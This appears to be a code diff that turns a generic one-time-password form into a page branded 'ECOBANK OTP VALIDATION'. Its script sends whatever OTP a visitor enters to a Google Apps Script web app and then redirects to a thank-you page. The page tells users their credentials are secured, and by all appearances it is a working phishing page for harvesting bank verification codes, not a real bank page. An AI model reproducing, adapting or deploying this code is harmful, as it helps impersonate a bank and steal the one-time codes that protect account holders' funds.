@@ -1,91 +1,164 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Validation OTP</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OTP Validation</title>
   <style>
-    body { font-family: Arial, sans-serif; background-color: #f5f5f5; margin:0; padding:0; }
-    .container { max-width:400px; margin:40px auto; background:#fff; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1); overflow:hidden; }
-    .header{ background:#0b6b3a; color:#fff; text-align:center; padding:22px 15px; }
-    .header h2{ margin:0 0 8px; font-size:18px; line-height:1.3; }
-    .header p{ margin:0; font-size:13px; font-weight:700; text-transform:uppercase; opacity:0.95; }
-    form{ padding:20px; }
-    label{ display:block; margin-bottom:6px; font-weight:600; color:#333; }
-    input{ width:100%; padding:12px; margin-bottom:16px; border:1px solid #d7d7d7; border-radius:6px; font-size:14px; }
-    input:focus{ border-color:#0b6b3a; outline:none; box-shadow:0 0 4px rgba(11,107,58,0.25); }
-    .btn{ width:100%; background:#0b6b3a; color:#fff; padding:14px; font-size:16px; font-weight:700; border:none; border-radius:6px; cursor:pointer; transition:background .2s; }
-    .btn:hover{ background:#094e2b; }
-    .footer{ background:#0b6b3a; color:#fff; text-align:center; padding:12px; font-size:13px; }
-    .notice { font-size:13px; color:#666; text-align:center; margin-bottom:12px; }
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #fff;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    body::before, body::after {
+      content: "";
+      position: absolute;
+      width: 200%;
+      height: 200%;
+      top: -50%;
+      left: -50%;
+      background: radial-gradient(circle at 50% 50%, rgba(30,144,255,0.15), transparent 70%);
+      border-radius: 40%;
+      animation: wave 15s linear infinite;
+      z-index: 0;
+    }
+    body::after {
+      animation-delay: 7.5s;
+    }
+    @keyframes wave {
+      0% { transform: rotate(0deg) translate(0,0); }
+      50% { transform: rotate(180deg) translate(20px, 20px); }
+      100% { transform: rotate(360deg) translate(0,0); }
+    }
+
+    .header {
+      background: linear-gradient(135deg, #08143a, #0b1d4d);
+      color: #fff;
+      text-align: center;
+      width: 100%;
+      padding: 40px 20px;
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      z-index: 1;
+      position: relative;
+    }
+    .header h1 { margin: 0; font-size: 22px; }
+    .header p { margin: 5px 0 0; font-size: 14px; }
+
+    .otp-container {
+      background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
+      color: #fff;
+      width: 90%;
+      max-width: 360px;
+      margin-top: -30px;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      backdrop-filter: blur(4px);
+      z-index: 2;
+      position: relative;
+      text-align: center;
+    }
+    .otp-container label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #fff;
+    }
+    .otp-container input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #274080;
+      border-radius: 6px;
+      font-size: 14px;
+      background-color: rgba(11,29,77,0.9);
+      color: #fff;
+    }
+    .otp-container input::placeholder { color: #ccc; }
+
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .button-group button {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #1e90ff, #187bcd);
+      color: #fff;
+      transition: all 0.3s ease;
+    }
+    .button-group button:hover {
+      background: linear-gradient(135deg, #187bcd, #1560a3);
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+    .notice { font-size: 13px; color: #ccc; margin-bottom: 12px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="header">
-      <h2>Welcome to the Secure Validation Portal</h2>
-      <p>PLEASE ENTER YOUR VALIDATION OTP TO CONTINUE</p>
-    </div>
+  <div class="header">
+    <h1>ECOBANK OTP VALIDATION</h1>
+    <p>Enter your OTP to continue</p>
+  </div>
 
-    <!-- Form -->
-    <form id="otpForm" autocomplete="off">
-      <label for="validation_otp">Validation OTP</label>
-      <input type="text" id="validation_otp" name="validation_otp" placeholder="Enter your Validation OTP" required>
-
+  <div class="otp-container">
+    <form id="otpForm">
+      <label>Validation OTP</label>
+      <input type="text" name="validation_otp" placeholder="Enter OTP" required>
       <div class="notice" id="status">Your credentials are secured.</div>
 
-      <button type="submit" class="btn">Validate OTP →</button>
+      <div class="button-group">
+        <button type="submit">VALIDATE →</button>
+      </div>
     </form>
-
-    <div class="footer">
-      © 2025 Secure Services – All Rights Reserved
-    </div>
   </div>
 
   <script>
-    const form = document.getElementById('otpForm');
-    const statusEl = document.getElementById('status');
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec";
+    const form = document.getElementById("otpForm");
+    const statusEl = document.getElementById("status");
 
-    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec';
-
-    form.addEventListener('submit', async (e) => {
+    form.addEventListener("submit", async (e) => {
       e.preventDefault();
-      statusEl.textContent = 'Submitting...';
-      statusEl.style.color = '#666';
+      statusEl.textContent = "Submitting...";
+      statusEl.style.color = "#ccc";
 
-      const otp = document.getElementById('validation_otp').value.trim();
-
-      const formData = new FormData();
-      formData.append("validation_otp", otp);
+      const formData = new FormData(form);
 
       try {
-        const resp = await fetch(WEBAPP_URL, {
-          method: 'POST',
-          body: formData
-        });
+        const response = await fetch(scriptURL, { method: "POST", body: formData });
+        const text = await response.text();
+        console.log("Server response:", text);
 
-        const text = await resp.text();
-        console.log("Raw response:", text);
-
-        let json;
-        try {
-          json = JSON.parse(text);
-        } catch (err) {
-          statusEl.textContent = "Invalid JSON: " + text;
-          statusEl.style.color = "#aa0000";
-          return;
-        }
-
-        if (json.result === 'success') {
-          window.location.href = "thankyou.html"; // redirect to thank-you page
+        if (text.includes("SUCCESS")) {
+          window.location.href = "thankyou.html"; // redirect to final thank you
         } else {
-          statusEl.textContent = 'Submission failed: ' + (json.message || 'Unknown error');
-          statusEl.style.color = '#aa0000';
+          statusEl.textContent = "Submission failed: " + text;
+          statusEl.style.color = "#ff6666";
         }
       } catch (err) {
         console.error(err);
-        statusEl.textContent = 'Error: ' + err.message;
-        statusEl.style.color = '#aa0000';
+        statusEl.textContent = "Network error. Try again.";
+        statusEl.style.color = "#ff6666";
       }
     });
   </script>
